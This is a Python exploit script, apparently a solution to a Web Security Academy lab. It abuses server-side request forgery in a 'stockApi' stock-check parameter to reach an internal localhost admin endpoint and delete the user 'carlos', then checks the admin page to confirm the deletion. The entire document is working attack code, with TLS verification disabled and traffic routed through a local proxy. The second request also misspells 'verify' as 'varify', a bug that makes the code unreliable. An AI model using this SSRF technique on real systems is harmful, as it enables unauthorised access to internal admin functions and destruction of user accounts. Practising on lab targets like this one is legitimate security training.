import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https': 'https://127.0.0.1:8080'}

def delete_user(url):
    delete_payload = 'http://localhost/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    data = {'stockApi': delete_payload}
    r = requests.post(url + check_stock_path, data=data, verify=False, proxies=proxies)

    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost/admin'
    data2 = {'stockApi': admin_ssrf_payload}
    r= requests.post(url + check_stock_path, data=data2, varify=False, proxies=proxies)
    if 'User deleted successfully' in r.text:
        print("Exploite worked")
    else:
        print("exploit Failed")

def main():
    url = 'https://0ae9004104ae688a812e1163006000d7.web-security-academy.net'
    delete_user(url)

if __name__ == '__main__':
    main()